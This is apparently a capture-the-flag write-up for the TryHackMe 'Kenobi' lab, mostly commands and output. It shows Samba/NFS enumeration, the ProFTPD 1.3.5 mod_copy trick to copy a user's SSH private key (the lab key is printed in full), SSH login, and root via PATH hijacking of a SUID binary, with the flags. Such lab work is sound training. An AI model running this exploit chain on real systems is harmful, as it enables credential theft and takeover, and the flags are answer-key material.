@@ -1,0 +1,483 @@
+KENOBI.
+
+
+
+
+[>>> TASK 1: DEPLOY THE VULNERABLE MACHINE]
+[1.1. MAKE SURE YOU'RE CONNECTED TO OUR NETWORK AND DEPLOY THE MACHINE]
+Nothing to answer here.
+
+
+
+[1.2. SCAN THE MACHINE WITH NMAP, HOW MANY PORTS ARE OPEN?]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.119.163
+[OUTPUT]
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         ProFTPD 1.3.5
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2049/tcp  open  nfs         2-4 (RPC #100003)
+35287/tcp open  mountd      1-3 (RPC #100005)
+45655/tcp open  mountd      1-3 (RPC #100005)
+46219/tcp open  nlockmgr    1-4 (RPC #100021)
+51289/tcp open  mountd      1-3 (RPC #100005)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+[NOTE]
+I get 11 ports.
+Thm expects 7.
+[ANSWER]
+Answer 7.
+
+
+
+
+[>>> TASK 2: ENUMERATING SAMBA SHARES]
+[2.1. USING THE NMAP COMMAND ABOVE, HOW MANY SHARES HAVE BEEN FOUND?]
+[ACTION: run provided nmap smb share enum command]
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.119.163
+[OUTPUT]
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.119.163\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 2
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.119.163\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.119.163\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+[NOTE]
+We get 3 shares: IPC$, anonymous and print$.
+[ANSWER]
+3
+
+
+
+[2.2. ONCE YOU'RE CONNECTED, LIST THE FILES ON THE SHARE. WHAT IS THE FILE YOU CAN SEE?]
+[NOTE]
+Press enter when prompted for password.
+[ACTION: connect to anon share]
+smbclient //10.10.119.163/anonymous
+
+
+[ACTION: list directory content]
+dir
+[OUTPUT]
+  .                                   D        0  Wed Sep  4 12:49:09 2019
+  ..                                  D        0  Wed Sep  4 12:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 12:49:09 2019
+[ANSWER]
+log.txt
+
+
+
+[2.3. YOU CAN RECURSIVELY DOWNLOAD THE SMB SHARE TOO. SUBMIT THE USERNAME AND PASSWORD AS NOTHING]
+[ACTION: download whole anon share]
+recurse on
+prompt off
+mget *
+exit
+
+
+[ACTION: display log]
+cat log.txt
+[OUTPUT (snippet)]
+# This is a basic ProFTPD configuration file (rename it to 
+# 'proftpd.conf' for actual use.  It establishes a single server
+# and a single anonymous login.  It assumes that you have a user/group
+# "nobody" and "ftp" for normal operation and anon.
+
+ServerName			"ProFTPD Default Installation"
+ServerType			standalone
+DefaultServer			on
+
+# Port 21 is the standard FTP port.
+Port				21
+[ANSWER]
+21
+
+
+
+[2.4. WHAT MOUNT CAN WE SEE?]
+[ACTION: enumperate nfs]
+nmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.119.163
+[OUTPUT]
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /var *
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1836524.0  6877104.0  22%   16.0T        32000
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+[ANSWER]
+/var
+
+
+
+
+[>>> TASK 3: GAIN INITIAL ACCESS WITH PROFTPD]
+[3.1. WHAT IS THE VERSION?]
+[ACTION: netcat to ftp port]
+nc 10.10.119.163 21
+[OUTPUT]
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.119.163]
+[ANSWER]
+
+
+
+[3.2. HOW MANY EXPLOITS ARE THERE FOR THE PROFTPD RUNNING?]
+[ACTION: search for exploits on exploitdb]
+searchsploit proftpd 1.3.5
+[OUTPUT]
+-------------------------------------- ---------------------------------
+ Exploit Title                        |  Path
+-------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Ex | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Com | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Com | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy             | linux/remote/36742.txt
+-------------------------------------- ---------------------------------
+Shellcodes: No Results
+[ANSWER]
+4
+
+
+
+[3.3. WE KNOW THAT THE FTP SERVICE IS RUNNING AS THE Kenobi USER (FROM THE FILE ON THE SHARE) AND AN SSH KEY IS GENERATED FOR THAT USER]
+Nothing to answer here.
+[NOTE]
+Run searchsploit -x linux/remote/37262.rb and similar to get more info on exploit.
+[ACTION: copy chosen exploit to active directory]
+searchsploit -m linux/remote/36803.py
+[NOTE]
+This is optional, since the room provides the commands to do it manually.
+
+
+[ACTION: copy Kenobi's ssh key to tmp]
+nc 10.10.119.163 21
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+[OUTPUT]
+250 Copy successful
+
+
+
+[3.4. WE KNEW THAT /var DIRECTORY WAS A MOUNT WE COULD SEE (TASK 2, QUESTION 4). SO WE'VE NOW MOVED Kenobi's PRIVATE KEY TO THE /var/tmp DIRECTORY]
+Nothing to answer here.
+[ACTION: mount /var/tmp local]
+sudo mkdir /mnt/kenobinfs # dir we will mount to
+sudo mount 10.10.119.163:/var /mnt/kenobinfs # online and local dirs (origin and destination)
+
+
+[ACTION: verify results]
+ls -la /mnt/kenobinfs
+[OUTPUT]
+drwxr-xr-x 14 root root    4096 Sep  4  2019 .
+drwxr-xr-x  5 root root    4096 Aug  5 17:37 ..
+drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root tcpdump 4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail    4096 Feb 27  2019 mail
+drwxr-xr-x  2 root root    4096 Feb 27  2019 opt
+lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
+drwxr-xr-x  2 root root    4096 Jan 30  2019 snap
+drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root    4096 Aug  5 17:34 tmp
+drwxr-xr-x  3 root root    4096 Sep  4  2019 www
+[NOTE]
+Looks like we managed to mount the machine.
+
+
+[ACTION: display kenobi's ssh flag]
+cat /mnt/kenobinfs/tmp/id_rsa
+[OUTPUT]
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
+qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
+U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
+dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
+y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
+otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
+ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
+dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
+bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
+tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
+YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
+bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
+t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
+rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
+dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
+mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
+SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
+dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
+u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
+YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
+TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
+P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
+H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
+S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
+Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
+-----END RSA PRIVATE KEY-----
+
+
+[ACTION: Save kenobi's flag to current directory]
+cat /mnt/kenobinfs/tmp/id_rsa > kenobi_key
+
+
+
+[3.5. WHAT IS kenobi's USER FLAG (/home/kenobi/user.txt)?]
+[ACTION: ssh as kenobi]
+chmod 600 kenobi_key
+ssh kenobi@10.10.119.163 -p 22 -i kenobi_key
+[OUTPUT]
+kenobi@kenobi:~$
+
+
+[ACTION: display user flag]
+cat user.txt
+[OUTPUT]
+d0b0f3f53b6caa532a83915e19224899
+
+
+
+
+[>>> TASK 4: PRIVILEGE ESCALATION WITH PATH VARIABLE MANIPULATION]
+[4.1. WHAT FILE LOOKS PARTICULARLY OUT OF THE ORDINARY? ]
+[ACTION: list suid binaries]
+find / -perm -u=s -type f 2>/dev/null
+[NOTE]
+Also valid:
+find / -type f -perm /4000 2>/dev/null
+[OUTPUT]
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+[NOTE]
+menu is unusual.
+Probably not something preinstalled on the system.
+[ANSWER]
+/usr/bin/menu
+
+
+
+[4.2. RUN THE BINARY, HOW MANY OPTIONS APPEAR?]
+[ACTION: run menu]
+/usr/bin/menu
+[OUTPUT]
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+[ANSWER]
+3
+
+
+[ACTION: display binary code]
+strings /usr/bin/menu
+[OUTPUT]
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+UH-`
+AWAVA
+AUATL
+[]A\A]A^A_
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+ Invalid choice
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7594
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+menu.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+[NOTE]
+Full path isn't set for curl.
+When looking for it, the binary starts from the current directory.
+This means we can create a fake one.
+
+
+
+[4.3. WE COPIED THE /bin/sh SHELL, CALLED IT CURL, GAVE IT THE CORRECT PERMISSIONS AND THEN PUT ITS LOCATION IN OUR PATH. THIS MEANT THAT WHEN THE /usr/bin/menu BINARY WAAS RUN, ITS USING OUR PATH VARIABLE TO FIND THE "curl" BINARY.. WHICH IS ACTUALLY A VERSION OF /usr/sh, AS WELL AS THIS FILE BEING RUN AS ROOT IT RUNS OUR SHELL AS ROOT!]
+Nothing to answer here.
+
+
+
+[4.4. WHAT IS THE ROOT FLAG (/root/root.txt)?]
+[ACTION: create fake curl]
+cp /bin/sh ./curl
+
+
+[ACTION: make it executable by everyone]
+chmod 755 ./curl
+
+
+[ACTION: add fake curl to path]
+export PATH=$(pwd):$PATH
+
+
+[ACTION: display new path]
+echo $PATH
+[OUTPUT]
+/home/kenobi:/home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+
+[ACTION: run exploit]
+/usr/bin/menu
+1
+[OUTPUT]
+curl: 0: Can't open localhost
+
+
+[ACTION: make curl ignore arguments (just spawn the shell)]
+echo -e '#!/bin/sh\n/bin/sh' > ./curl
+[OUTPUT (after rerunning last step)]
+#
+
+
+[ACTION: display root flag]
+cat /root/root.txt
+[OUTPUT]
+177b3cd8562289f37382721c28381f02
+[ANSWER]
+177b3cd8562289f37382721c28381f02
+
